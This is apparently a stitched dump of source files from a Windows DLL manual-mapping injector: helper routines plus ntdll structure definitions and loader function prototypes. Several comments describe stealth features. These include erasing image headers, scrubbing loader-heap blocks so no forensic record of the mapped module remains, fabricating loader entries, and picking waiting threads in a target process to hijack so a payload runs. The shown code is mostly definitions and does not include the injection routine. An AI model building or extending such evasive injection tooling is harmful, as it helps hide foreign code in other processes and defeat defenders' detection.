__forceinline DWORD MMI_SizeOfHeaders(const MMAP_NATIVE::MANUAL_MAPPING_DATA * pData)
{
	if (pData->Flags & INJ_ERASE_HEADER)
	{
		return pData->CachedSizeOfHeaders;
	}

	return pData->pOptionalHeader->SizeOfHeaders;
}

__forceinline DWORD MMI_EntryPoint(const MMAP_NATIVE::MANUAL_MAPPING_DATA * pData)
{
	if (pData->Flags & INJ_ERASE_HEADER)
	{
		return pData->CachedEntryPoint;
	}

	return pData->pOptionalHeader->AddressOfEntryPoint;
}

__forceinline bool MMI_InImage(const MMAP_NATIVE::MANUAL_MAPPING_DATA * pData, const void * address, size_t size)
{
	if (!pData || !pData->pImageBase || !pData->pOptionalHeader || !address || !size)
	{
		return false;
	}

	const ULONG_PTR base = ReCa<ULONG_PTR>(pData->pImageBase);
	const ULONG_PTR target = ReCa<ULONG_PTR>(address);
	const ULONG_PTR image_size = MMI_SizeOfImage(pData);

	return target >= base && size <= image_size && target - base <= image_size - size;
}

__forceinline size_t MMI_BoundedStringLength(const char * text, size_t maximum)
{
	size_t length = 0;

	while (length < maximum && text[length])
	{
		++length;
	}

	return length;
}

__forceinline size_t MMI_ImageStringLength(const MMAP_NATIVE::MANUAL_MAPPING_DATA * pData, const char * text)
{
	if (!MMI_InImage(pData, text, sizeof(char)))
	{
		return 0;
	}

	const ULONG_PTR base = ReCa<ULONG_PTR>(pData->pImageBase);
	const size_t maximum = static_cast<size_t>(MMI_SizeOfImage(pData) - (ReCa<ULONG_PTR>(text) - base));

	const size_t length = MMI_BoundedStringLength(text, maximum);

	return length == maximum ? 0 : length;
}

// A3: identifies the two debug-print exports by length and byte-immediate
// comparison. No string literals and no static arrays: this helper is
// inlined into the copied shell, where a data reference would point outside
// the copied span. "OutputDebugStringA" and "OutputDebugStringW" are both 18
// characters.
__forceinline bool MMI_IsDebugPrintImport(const char * name, size_t length) noexcept
{
	if (!name || length != 18)
	{
		return false;
	}

	return name[0] == 'O' && name[1] == 'u' && name[2] == 't' && name[3] == 'p' && name[4] == 'u' && name[5] == 't'
		&& name[6] == 'D' && name[7] == 'e' && name[8] == 'b' && name[9] == 'u' && name[10] == 'g'
		&& name[11] == 'S' && name[12] == 't' && name[13] == 'r' && name[14] == 'i' && name[15] == 'n' && name[16] == 'g'
		&& (name[17] == 'A' || name[17] == 'W');
}

__forceinline bool MMI_IsApisetName(const MMAP_NATIVE::MANUAL_MAPPING_DATA * pData, const char * text)

{
	static const char kApi[] = { 'a', 'p', 'i', '-', 'm', 's', '-' };
	static const char kExt[] = { 'e', 'x', 't', '-', 'm', 's', '-' };

	bool api = true;
	bool ext = true;

	for (size_t i = 0; i < 7; ++i)
	{
		if (!MMI_InImage(pData, text + i, sizeof(char)))
		{
			return false;
		}
		char c = text[i];
		if (c >= 'A' && c <= 'Z')
		{
			c = static_cast<char>(c + ('a' - 'A'));
		}
		api = api && (c == kApi[i]);
		ext = ext && (c == kExt[i]);
		if (!api && !ext)
		{
			return false;
		}
	}

	return api || ext;
}

template <class T>
__forceinline void DeleteObject(MMAP_NATIVE::MANUAL_MAPPING_FUNCTION_TABLE * f, T * Object)
{

	void * heap = MMI_LdrpHeap(f);
	if (Object && f && f->RtlFreeHeap && heap)
	{
		f->RtlFreeHeap(heap, NULL, Object);
	}
}

// A2: zero a loader-heap block before returning it to the heap. The loader heap
// is shared with the rest of ntdll, so a freed-but-unscrubbed block is a
// readable record of the mapped image (module names, paths, the fabricated
// loader entry) long after the load has finished. Bytes must be the exact
// allocation size; the caller owns that value because this helper has no way to
// recover it from the block header.
template <class T>
__forceinline void ScrubFreeObject(MMAP_NATIVE::MANUAL_MAPPING_FUNCTION_TABLE * f, T * Object, size_t Bytes)
{
	if (!Object)
	{
		return;
	}

	if (f && f->RtlZeroMemory && Bytes)
	{
		f->RtlZeroMemory(Object, Bytes);
	}

	DeleteObject(f, Object);
}

__forceinline bool InitAnsiString(MMAP_NATIVE::MANUAL_MAPPING_FUNCTION_TABLE * f, ANSI_STRING * String, const char * szString, size_t Length)
{

	if (!Length || Length > 0xFFFF || MMI_BoundedStringLength(szString, Length + 1) != Length)
	{
		return false;
	}

	String->szBuffer = NewObject<char>(f, Length + 1);
	if (!String->szBuffer)
	{
		return false;
	}

	String->Length = static_cast<WORD>(Length);
	String->MaxLength = static_cast<WORD>((Length + 1) * sizeof(char));
	f->memmove(String->szBuffer, szString, Length);

	return true;
}

#pragma endregion

```

### Ameger/NT/NTDefinitions.h â€” 452 lines â€” sha12:477BBF7F2A89
```c-header
#pragma once

#include "Core/Utility/Header/PrecompiledHeader.h"

#pragma region nt (un)defines

#ifndef NT_FAIL
#define NT_FAIL(status) (status < 0)
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(status) (status >= 0)
#endif

#ifdef memmove
#undef memmove
#endif

#ifdef RtlZeroMemory
#undef RtlZeroMemory
#endif

#define STATUS_SUCCESS				0x00000000
#define STATUS_UNSUCCESSFUL			0xC0000001
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define STATUS_APISET_NOT_HOSTED	0xC0000481
#ifndef STATUS_DLL_NOT_FOUND
#define STATUS_DLL_NOT_FOUND		0xC0000135
#endif
#ifndef STATUS_ENTRYPOINT_NOT_FOUND
#define STATUS_ENTRYPOINT_NOT_FOUND 0xC0000139
#endif
#ifndef STATUS_ACCESS_DENIED
#define STATUS_ACCESS_DENIED 0xC0000022
#endif
#ifndef STATUS_INVALID_PARAMETER
#define STATUS_INVALID_PARAMETER 0xC000000D
#endif

#ifndef STATUS_INVALID_IMAGE_FORMAT
#define STATUS_INVALID_IMAGE_FORMAT 0xC000007B
#endif

typedef LONG KPRIORITY;

#define KUSER_SHARED_DATA (DWORD)0x7FFE0000

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

#pragma endregion

#pragma region enums

typedef enum class _PROCESSINFOCLASS
{
	ProcessBasicInformation			= 0,
	ProcessImageFileName			= 27,
	ProcessImageFileNameWin32		= 43
} PROCESSINFOCLASS;

typedef enum class _SYSTEM_INFORMATION_CLASS
{
	SystemProcessInformation		= 5,
	SystemExtendedHandleInformation	= 64
} SYSTEM_INFORMATION_CLASS;

typedef enum class _THREADINFOCLASS
{
	ThreadBasicInformation			= 0
} THREADINFOCLASS;

// These two carry a value that was read out of the kernel, so the zero that
// a default-constructed instance holds has to be a state the kernel can
// actually report. "Unknown" is the zero value for that reason: the real
// meaning of "Running" is resolved from the PDB at run time, and the values
// here are only the fallbacks.
typedef enum class _KTHREAD_STATE : ULONG
{
	Unknown = 0x00,
	Running = 0x02,
	Waiting = 0x05
} KTHREAD_STATE;

typedef enum class _KWAIT_REASON : ULONG
{
	Unknown = 0x00,
	WrQueue = 0x10
} KWAIT_REASON;

namespace WAIT_REASON_SAFE
{
	// The kernel's ThreadWaitReason values a thread can be parked on and still
	// be expected to run again without help from whoever is looking at it.
	//
	// A user-mode wait (a message, a timer, an APC) is released by an
	// unrelated wakeup or by the timer expiring on its own. A kernel wait is
	// not: the thread is blocked inside the executive and an unrelated event
	// will not reach it. And a suspended thread is never released at all until
	// somebody resumes it, so parking a payload on one means the payload never
	// runs.
	//
	// Suspended (6) and WrPageOut (11) are deliberately not on this list.
	constexpr unsigned char UserRequest		= 4;
	constexpr unsigned char UserDelay		= 7;
	constexpr unsigned char WrUserRequest	= 12;
	constexpr unsigned char WrUserDelay	= 15;
	constexpr unsigned char WrUserRequest2	= 22;

	__forceinline bool IsSafe(unsigned char reason)
	{
		return reason == UserRequest || reason == UserDelay ||
			reason == WrUserRequest || reason == WrUserDelay ||
			reason == WrUserRequest2;
	}

	// B2: a delay wait parks the thread on a timer whose remaining time is
	// unknowable from outside, so it is a donor of last resort: the hijack
	// window is however long that timer still has to run. The event-driven
	// safe waits are preferred first, and a delay wait is only taken when
	// nothing else qualified within the probe budget.
	__forceinline bool IsDelay(unsigned char reason)
	{
		return reason == UserDelay || reason == WrUserDelay;
	}
}

typedef enum _LDR_DDAG_STATE : int
{
	LdrModulesMerged					= -5,
	LdrModulesInitError					= -4,
	LdrModulesSnapError					= -3,
	LdrModulesUnloaded					= -2,
	LdrModulesUnloading					= -1,
	LdrModulesPlaceHolder				= 0,
	LdrModulesMapping					= 1,
	LdrModulesMapped					= 2,
	LdrModulesWaitingForDependencies	= 3,
	LdrModulesSnapping					= 4,
	LdrModulesSnapped					= 5,
	LdrModulesCondensed					= 6,
	LdrModulesReadyToInit				= 7,
	LdrModulesInitializing				= 8,
	LdrModulesReadyToRun				= 9
} LDR_DDAG_STATE, * PLDR_DDAG_STATE;

typedef enum _LDR_DLL_LOAD_REASON : int
{
	LoadReasonUnknown						= -1,
	LoadReasonStaticDependency				= 0,
	LoadReasonStaticForwarderDependency		= 1,
	LoadReasonDynamicForwarderDependency	= 2,
	LoadReasonDelayloadDependency			= 3,
	LoadReasonDynamicLoad					= 4,
	LoadReasonAsImageLoad					= 5,
	LoadReasonAsDataLoad					= 6,
	LoadReasonEnclavePrimary				= 7,
	LoadReasonEnclaveDependency				= 8,
	LoadReasonPatchImage					= 9
} LDR_DLL_LOAD_REASON, * PLDR_DLL_LOAD_REASON;

typedef enum _LDR_HOT_PATCH_STATE
{
    LdrHotPatchBaseImage		= 0,
    LdrHotPatchNotApplied		= 1,
    LdrHotPatchAppliedReverse	= 2,
    LdrHotPatchAppliedForward	= 3,
    LdrHotPatchFailedToPatch	= 4,
    LdrHotPatchStateMax			= 5
} LDR_HOT_PATCH_STATE, * PLDR_HOT_PATCH_STATE;

#pragma endregion

struct PEB;

typedef struct _ANSI_STRING
{
	USHORT	Length;
	USHORT	MaxLength;
	char *	szBuffer;
} ANSI_STRING, * PANSI_STRING;

typedef struct _UNICODE_STRING
{
	WORD		Length;
	WORD		MaxLength;
	wchar_t *	szBuffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _RTL_BALANCED_NODE
{
	union
	{
		struct _RTL_BALANCED_NODE * Children[2];
		struct
		{
			struct _RTL_BALANCED_NODE * Left;
			struct _RTL_BALANCED_NODE * Right;
		};
	};

	ULONG_PTR ParentValue;
} RTL_BALANCED_NODE, * PRTL_BALANCED_NODE;

typedef struct _RTL_RB_TREE
{
	RTL_BALANCED_NODE * Root;
	RTL_BALANCED_NODE * Min;
} RTL_RB_TREE, * PRTL_RB_TREE;

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _THREAD_BASIC_INFORMATION
{
	NTSTATUS	ExitStatus;
	PVOID		TebBaseAddress;
	CLIENT_ID	ClientId;
	KAFFINITY	AffinityMask;
	KPRIORITY	Priority;
	KPRIORITY	BasePriority;
} THREAD_BASIC_INFORMATION, * PTHREAD_BASIC_INFORMATION;

typedef struct _PROCESS_BASIC_INFORMATION
{
	NTSTATUS	ExitStatus;
	PEB	*	pPEB;
	ULONG_PTR	AffinityMask;
	LONG		BasePriority;
	HANDLE		UniqueProcessId;
	HANDLE		InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

typedef struct _SYSTEM_THREAD_INFORMATION
{
	LARGE_INTEGER	KernelTime;
	LARGE_INTEGER	UserTime;
	LARGE_INTEGER	CreateTime;
	ULONG			WaitTime;
	PVOID			StartAddress;
	CLIENT_ID		ClientId;
	KPRIORITY		Priority;
	LONG			BasePriority;
	ULONG			ContextSwitches;
	ULONG			ThreadState;
	ULONG			WaitReason;
} SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION
{
	ULONG			NextEntryOffset;
	ULONG			NumberOfThreads;
	LARGE_INTEGER	WorkingSetPrivateSize;
	ULONG			HardFaultCount;
	ULONG			NumberOfThreadsHighWatermark;
	ULONGLONG		CycleTime;
	LARGE_INTEGER	CreateTime;
	LARGE_INTEGER	UserTime;
	LARGE_INTEGER	KernelTime;
	UNICODE_STRING	ImageName;
	KPRIORITY		BasePriority;
	HANDLE			UniqueProcessId;
	HANDLE			InheritedFromUniqueProcessId;
	ULONG			HandleCount;
	ULONG			SessionId;
	ULONG_PTR		UniqueProcessKey;
	SIZE_T			PeakVirtualSize;
	SIZE_T			VirtualSize;
	ULONG			PageFaultCount;
	SIZE_T 			PeakWorkingSetSize;
	SIZE_T			WorkingSetSize;
	SIZE_T			QuotaPeakPagedPoolUsage;
	SIZE_T 			QuotaPagedPoolUsage;
	SIZE_T 			QuotaPeakNonPagedPoolUsage;
	SIZE_T 			QuotaNonPagedPoolUsage;
	SIZE_T 			PagefileUsage;
	SIZE_T 			PeakPagefileUsage;
	SIZE_T 			PrivatePageCount;
	LARGE_INTEGER	ReadOperationCount;
	LARGE_INTEGER	WriteOperationCount;
	LARGE_INTEGER	OtherOperationCount;
	LARGE_INTEGER 	ReadTransferCount;
	LARGE_INTEGER	WriteTransferCount;
	LARGE_INTEGER	OtherTransferCount;
	SYSTEM_THREAD_INFORMATION Threads[1];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG				Length;
	HANDLE				RootDirectory;
	UNICODE_STRING *	ObjectName;
	ULONG				Attributes;
	PVOID				SecurityDescriptor;
	PVOID				SecurityQualityOfService;
}  OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _PEB_LDR_DATA
{
	ULONG		Length;
	BYTE		Initialized;
	HANDLE		SsHandle;
	LIST_ENTRY	InLoadOrderModuleListHead;
	LIST_ENTRY	InMemoryOrderModuleListHead;
	LIST_ENTRY	InInitializationOrderModuleListHead;
	PVOID		EntryInProgress;
	BYTE		ShutdownInProgress;
	HANDLE		ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

static_assert(sizeof(CLIENT_ID) == 16);
static_assert(sizeof(UNICODE_STRING) == 16);
static_assert(sizeof(ANSI_STRING) == 16);
static_assert(sizeof(RTL_BALANCED_NODE) == 24);
static_assert(sizeof(RTL_RB_TREE) == 16);
static_assert(sizeof(OBJECT_ATTRIBUTES) == 48);
static_assert(sizeof(PEB_LDR_DATA) == 88);
static_assert(offsetof(PEB_LDR_DATA, InLoadOrderModuleListHead) == 16);
static_assert(offsetof(PEB_LDR_DATA, InMemoryOrderModuleListHead) == 32);
static_assert(offsetof(PEB_LDR_DATA, InInitializationOrderModuleListHead) == 48);

struct PEB
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;

	union
	{
		UCHAR BitField;
		struct
		{
			UCHAR ImageUsedLargePages			: 1;
			UCHAR IsProtectedProcess			: 1;
			UCHAR IsImageDynamicallyRelocated	: 1;
			UCHAR SkipPatchingUser32Forwarders	: 1;
			UCHAR IsPackagedProcess				: 1;
			UCHAR IsAppContainer				: 1;
			UCHAR IsProtectedProcessLight		: 1;
			UCHAR IsLongPathAwareProcess		: 1;
		};
	};

	HANDLE Mutant;

	PVOID ImageBaseAddress;

	PEB_LDR_DATA * Ldr;

	PVOID					*	ProcessParameters;
	PVOID						SubSystemData;
	HANDLE						ProcessHeap;
	RTL_CRITICAL_SECTION	*	FastPebLock;
	PVOID						AtlThunkSListPtr;
	PVOID						IFEOKey;

	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob					: 1;
			ULONG ProcessInitializing			: 1;
			ULONG ProcessUsingVEH				: 1;
			ULONG ProcessUsingVCH				: 1;
			ULONG ProcessUsingFTH				: 1;
			ULONG ProcessPreviouslyThrottled	: 1;
			ULONG ProcessCurrentlyThrottled		: 1;
			ULONG ProcessImagesHotPatched		: 1;
			ULONG ReservedBits0					: 24;
		};
	};

	union

	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	};

	ULONG SystemReserved;
	ULONG AtlThunkSListPtr32;
	PVOID ApiSetMap;
	ULONG TlsExpansionCounter;

	UCHAR Padding2[4];

	PVOID TlsBitmap;
	ULONG TlsBitmapBits[2];
	PVOID ReadOnlySharedMemoryBase;

	union
	{
		PVOID HotpatchInformation;
		PVOID SparePvoid0;
		PVOID SharedData;
	};

	PVOID * ReadOnlyStaticServerData;
	PVOID AnsiCodePageData;
	PVOID OemCodePageData;
	PVOID UnicodeCaseTableData;
	ULONG NumberOfProcessors;
	ULONG NtGlobalFlag;
	LARGE_INTEGER CriticalSectionTimeout;
	ULONG_PTR HeapSegmentReserve;
	ULONG_PTR HeapSegmentCommit;
	ULONG_PTR HeapDeCommitTotalFreeThreshold;
	ULONG_PTR HeapDeCommitFreeBlockThreshold;
	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
	PVOID * ProcessHeaps;
	PVOID GdiSharedHandleTable;
	PVOID ProcessStarterHelper;
	ULONG GdiDCAttributeList;

	UCHAR Padding3[4];

	RTL_CRITICAL_SECTION * LoaderLock;
	ULONG OSMajorVersion;
	ULONG OSMinorVersion;

	USHORT OSBuildNumber;
	USHORT OSCSDVersion;
};

static_assert(sizeof(PEB) == 296);
static_assert(offsetof(PEB, Mutant) == 8);
static_assert(offsetof(PEB, ImageBaseAddress) == 16);
static_assert(offsetof(PEB, Ldr) == 24);
static_assert(offsetof(PEB, ProcessParameters) == 32);
static_assert(offsetof(PEB, ProcessHeap) == 48);
static_assert(offsetof(PEB, CrossProcessFlags) == 80);
static_assert(offsetof(PEB, TlsExpansionCounter) == 112);
static_assert(offsetof(PEB, LoaderLock) == 272);
static_assert(offsetof(PEB, OSBuildNumber) == 288);

static_assert(sizeof(SYSTEM_THREAD_INFORMATION) == 80);
static_assert(sizeof(SYSTEM_PROCESS_INFORMATION) == 0x100 + sizeof(SYSTEM_THREAD_INFORMATION));
static_assert(offsetof(SYSTEM_THREAD_INFORMATION, ClientId) == 40);
static_assert(offsetof(SYSTEM_THREAD_INFORMATION, ThreadState) == 68);
static_assert(offsetof(SYSTEM_THREAD_INFORMATION, WaitReason) == 72);
static_assert(offsetof(SYSTEM_PROCESS_INFORMATION, UniqueProcessId) == 0x50);
static_assert(offsetof(SYSTEM_PROCESS_INFORMATION, Threads) == 0x100);

typedef struct _LDR_SERVICE_TAG_RECORD
{
	struct _LDR_SERVICE_TAG_RECORD * Next;
	ULONG ServiceTag;
} LDR_SERVICE_TAG_RECORD, * PLDR_SERVICE_TAG_RECORD;

typedef struct _LDRP_CSLIST
{
	struct _SINGLE_LIST_ENTRY * Tail;
} LDRP_CSLIST, * PLDRP_CSLIST;

typedef struct _LDRP_UNICODE_STRING_BUNDLE
{
	UNICODE_STRING	String;
	WCHAR			StaticBuffer[128];
} LDRP_UNICODE_STRING_BUNDLE, * PLDRP_UNICODE_STRING_BUNDLE;

typedef struct _RTL_INVERTED_FUNCTION_TABLE_ENTRY
{
	IMAGE_RUNTIME_FUNCTION_ENTRY *	ExceptionDirectory;
	PVOID							ImageBase;
	ULONG							ImageSize;
	ULONG							ExceptionDirectorySize;
} RTL_INVERTED_FUNCTION_TABLE_ENTRY, * PRTL_INVERTED_FUNCTION_TABLE_ENTRY;

typedef struct _RTL_INVERTED_FUNCTION_TABLE
{
	ULONG Count;
	ULONG MaxCount;
	ULONG Epoch;
	UCHAR Overflow;
	RTL_INVERTED_FUNCTION_TABLE_ENTRY Entries[ANYSIZE_ARRAY];
} RTL_INVERTED_FUNCTION_TABLE, * PRTL_INVERTED_FUNCTION_TABLE;

typedef struct _LDRP_PATH_SEARCH_CONTEXT
{
	wchar_t *	DllSearchPathOut;
	void	*	Unknown_0[3];
	wchar_t *	OriginalFullDllName;
	void	*	unknown_1[7];
	ULONG64		unknown_2[4];
} LDRP_PATH_SEARCH_CONTEXT, * PLDRP_PATH_SEARCH_CONTEXT;

typedef union _LDRP_LOAD_CONTEXT_FLAGS
{
	ULONG32 Flags;
	struct
	{
		ULONG32 Redirected					: 1;
		ULONG32 Static						: 1;
		ULONG32 BaseNameOnly				: 1;
		ULONG32 HasFullPath					: 1;
		ULONG32 KnownDll					: 1;
		ULONG32 SystemImage					: 1;
		ULONG32 ExecutableImage				: 1;
		ULONG32 AppContainerImage			: 1;
		ULONG32 CallInit					: 1;
		ULONG32 UserAllocated				: 1;
		ULONG32 SearchOnlyFirstPathSegment	: 1;
		ULONG32 RedirectedByAPISet			: 1;
	};
} LDRP_LOAD_CONTEXT_FLAGS, * PLDRP_LOAD_CONTEXT_FLAGS;

typedef struct _TLS_ENTRY
{
	LIST_ENTRY				TlsEntryLinks;
	IMAGE_TLS_DIRECTORY		TlsDirectory;
	PVOID 					ModuleEntry;
	SIZE_T					TlsIndex;
} TLS_ENTRY, * PTLS_ENTRY;

static_assert(sizeof(TLS_ENTRY) == 72);

```

### Ameger/NT/NTFunctions.h â€” 188 lines â€” sha12:11D5FE826EAF
```c-header
#pragma once

#include "Core/Utility/Header/PrecompiledHeader.h"

#include "NT/Windows11.h"

#define DEF_STRUCT_DEFAULT(name, suffix)	\
using name		= name##suffix;				\
using P##name	= P##name##suffix;			\
using _##name	= _##name##suffix;

DEF_STRUCT_DEFAULT(LDR_DATA_TABLE_ENTRY, _WIN11)
DEF_STRUCT_DEFAULT(LDR_DDAG_NODE, _WIN11)

#pragma region function prototypes

using f_LdrUnloadDll = NTSTATUS (__stdcall *)
(
	HANDLE DllHandle
);

using f_LdrpLoadDllInternal = VOID (__fastcall *)
(
	UNICODE_STRING				*	dll_path,
	LDRP_PATH_SEARCH_CONTEXT	*	search_path,
	LDRP_LOAD_CONTEXT_FLAGS			Flags,
	PVOID						DllHandle,
	LDR_DATA_TABLE_ENTRY_WIN11	*	Unknown1,
	LDR_DATA_TABLE_ENTRY_WIN11	*	Unknown2,
	LDR_DATA_TABLE_ENTRY_WIN11	**	ldr_out,
	NTSTATUS					*	ntRet,
	PVOID						LoadContext
);

using f_LdrGetProcedureAddress = NTSTATUS (__stdcall *)
(
	PVOID				BaseAddress,
	ANSI_STRING		*	Name,
	ULONG				Ordinal,
	PVOID			*	ProcedureAddress
);

using f_NtSetEvent = NTSTATUS (__stdcall *)
(
	HANDLE	EventHandle,
	PLONG	PreviousState
);

using f_NtClose = NTSTATUS (__stdcall *)
(
	HANDLE	Handle
);

using f_NtQueryInformationProcess = NTSTATUS (__stdcall *)
(
	HANDLE					hTargetProc,
	PROCESSINFOCLASS		PIC,
	void				*	pBuffer,
	ULONG					BufferSize,
	ULONG				*	SizeOut
);

// A10: the TLS registration uses the ntdll TLS API rather than the loader's
// module bookkeeping. These are real ntdll exports, resolved by name.
using f_TlsAlloc = DWORD(WINAPI *)(void);
using f_TlsSetValue = BOOL(WINAPI *)(DWORD dwTlsIndex, void * lpTlsValue);
using f_TlsFree = BOOL(WINAPI *)(DWORD dwTlsIndex);

using f_NtQuerySystemInformation = NTSTATUS	(__stdcall *)
(
	SYSTEM_INFORMATION_CLASS		SIC,
	void						*	pBuffer,
	ULONG							BufferSize,
	ULONG						*	SizeOut
);

using f_NtQueryInformationThread = NTSTATUS (__stdcall *)
(
	HANDLE				hThread,
	THREADINFOCLASS		TIC,
	void			*	pBuffer,
	ULONG				BufferSize,
	ULONG			*	SizeOut
);

using f_LdrpPreprocessDllName = NTSTATUS (__fastcall *)
(
	UNICODE_STRING				* DllName,
	LDRP_UNICODE_STRING_BUNDLE	* OutputDllName,
	LDR_DATA_TABLE_ENTRY		* pOptParentEntry,
	LDRP_LOAD_CONTEXT_FLAGS		* LoadContextFlags
);

using f_RtlInsertInvertedFunctionTable = BOOL (__fastcall *)
(
	void *	ImageBase,
	DWORD	SizeOfImage
);

using f_RtlLookupFunctionEntry = RUNTIME_FUNCTION * (__stdcall *)
(
	ULONGLONG	ControlPc,
	ULONGLONG * ImageBase,
	void * HistoryTable
);

using f_RtlAddFunctionTable = BOOL (__stdcall *)
(
	RUNTIME_FUNCTION *	FunctionTable,
	DWORD				EntryCount,
	DWORD64				BaseAddress
);

using f_RtlDeleteFunctionTable = BOOLEAN (__stdcall *)
(
	RUNTIME_FUNCTION *	FunctionTable
);

using f_RtlAddVectoredExceptionHandler = PVOID (__stdcall *)
(
	ULONG							First,
	PVECTORED_EXCEPTION_HANDLER		Handler
);

using f_RtlRemoveVectoredExceptionHandler = ULONG (__stdcall *)
(
	PVOID	Handle
);

using f_LdrpHandleTlsData = NTSTATUS (__fastcall *)
(
	LDR_DATA_TABLE_ENTRY * pEntry
);

using f_LdrLockLoaderLock = NTSTATUS (__stdcall *)
(
	ULONG			Flags,
	ULONG		*	State,
	ULONG_PTR	*	Cookie
);

using f_LdrUnlockLoaderLock = NTSTATUS (__stdcall *)
(
	ULONG		Flags,
	ULONG_PTR	Cookie
);

using f_LdrpDereferenceModule = NTSTATUS(__fastcall *)
(
	LDR_DATA_TABLE_ENTRY * pEntry
);

using f_memmove = VOID (__cdecl *)
(
	PVOID	UNALIGNED	Destination,
	LPCVOID	UNALIGNED	Source,
	SIZE_T				Length
);

using f_RtlZeroMemory = VOID (__stdcall *)
(
	PVOID	UNALIGNED	Destination,
	SIZE_T				Length
);

using f_RtlAllocateHeap = PVOID (__stdcall *)
(
	PVOID	HeapHandle,
	ULONG	Flags,
	SIZE_T	Size
);

using f_RtlFreeHeap = BOOLEAN (__stdcall *)
(
	PVOID	HeapHandle,
	ULONG	Flags,
	PVOID	BaseAddress
);

using f_RtlAnsiStringToUnicodeString = NTSTATUS (__stdcall *)
(
	UNICODE_STRING		*	DestinationString,
	const ANSI_STRING	*	SourceString,
	BOOLEAN					AllocateDestinationString
);

using f_NtAllocateVirtualMemory = NTSTATUS (__stdcall *)
(
	HANDLE			ProcessHandle,
	PVOID		*	BaseAddress,
	ULONG_PTR		ZeroBits,
	SIZE_T		*	RegionSize,
	ULONG			AllocationType,
	ULONG			Protect
);

using f_NtFreeVirtualMemory = NTSTATUS (__stdcall *)
(
	HANDLE		ProcessHandle,
	PVOID	*	BaseAddress,
	SIZE_T	*	RegionSize,
	ULONG		FreeType
);

using f_NtProtectVirtualMemory = NTSTATUS (__stdcall *)
(
	HANDLE		ProcessHandle,
	PVOID	*	BaseAddress,
	SIZE_T	*	Size,
	ULONG		NewAccess,
	ULONG	*	OldAccess
);

using f_LdrProtectMrdata = VOID (__stdcall *)
(
	BOOL bProtected
);

using f_LdrpHeap					= PVOID *;
using f_LdrpInvertedFunctionTable	= RTL_INVERTED_FUNCTION_TABLE *;
using f_LdrpTlsList					= LIST_ENTRY *;

#pragma endregion

inline HINSTANCE g_hNTDLL;

```

### Ameger/NT/Windows11.h â€” 96 lines â€” sha12:F7C2B1EC0F0F
```c-header
#pragma once

#include "NT/NTDefinitions.h"

typedef struct _LDR_DDAG_NODE_WIN11
{
	LIST_ENTRY				Modules;
	PLDR_SERVICE_TAG_RECORD	ServiceTagList;
	ULONG					LoadCount;
	ULONG					LoadWhileUnloadingCount;
	ULONG					LowestLink;
	PLDRP_CSLIST			Dependencies;
	PLDRP_CSLIST			IncomingDependencies;
	LDR_DDAG_STATE			State;
	SINGLE_LIST_ENTRY		CondenseLink;
	ULONG					PreorderNumber;
} LDR_DDAG_NODE_WIN11, * PLDR_DDAG_NODE_WIN11;

typedef struct _LDR_DATA_TABLE_ENTRY_WIN11
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;

	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;

	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;

	union
	{
		UCHAR FlagGroup[4];
		ULONG Flags;

		struct
		{
			ULONG PackagedBinary			: 1;
			ULONG MarkedForRemoval			: 1;
			ULONG ImageDll					: 1;
			ULONG LoadNotificationsSent		: 1;
			ULONG TelemetryEntryProcessed	: 1;
			ULONG ProcessStaticImport		: 1;
			ULONG InLegacyLists				: 1;
			ULONG InIndexes					: 1;
			ULONG ShimDll					: 1;
			ULONG InExceptionTable			: 1;
			ULONG ReservedFlags1			: 2;
			ULONG LoadInProgress			: 1;
			ULONG LoadConfigProcessed		: 1;
			ULONG EntryProcessed			: 1;
			ULONG ProtectDelayLoad			: 1;
			ULONG ReservedFlags3			: 2;
			ULONG DontCallForThreads		: 1;
			ULONG ProcessAttachCalled		: 1;
			ULONG ProcessAttachFailed		: 1;
			ULONG CorDeferredValidate		: 1;
			ULONG CorImage					: 1;
			ULONG DontRelocate				: 1;
			ULONG CorILOnly					: 1;
			ULONG ChpeImage					: 1;
			ULONG ReservedFlags5			: 2;
			ULONG Redirected				: 1;
			ULONG ReservedFlags6			: 2;
			ULONG CompatDatabaseProcessed	: 1;
		};
	};

	WORD ObsoleteLoadCount;
	WORD TlsIndex;

	LIST_ENTRY HashLinks;

	ULONG TimedateStamp;
	PVOID EntryPointActivationContext;
	PVOID Lock;

	LDR_DDAG_NODE_WIN11 * DdagNode;

	LIST_ENTRY	NodeModuleLink;
	PVOID		LoadContext;
	PVOID		ParentDllBase;
	PVOID		SwitchBackContext;

	RTL_BALANCED_NODE BaseAddressIndexNode;
	RTL_BALANCED_NODE MappingInfoIndexNode;

	ULONG_PTR			OriginalBase;
	LARGE_INTEGER		LoadTime;
	ULONG				BaseNameHashValue;
	LDR_DLL_LOAD_REASON	LoadReason;
	ULONG				ImplicitPathOptions;

	ULONG ReferenceCount;
	ULONG DependentLoadFlags;
	UCHAR SigningLevel;

	ULONG CheckSum;
	PVOID ActivePathImageBase;
	LDR_HOT_PATCH_STATE HotPatchState;
} LDR_DATA_TABLE_ENTRY_WIN11, * PLDR_DATA_TABLE_ENTRY_WIN11;

static_assert(sizeof(LDR_DDAG_NODE_WIN11) == 80);
static_assert(offsetof(LDR_DDAG_NODE_WIN11, State) == 56);
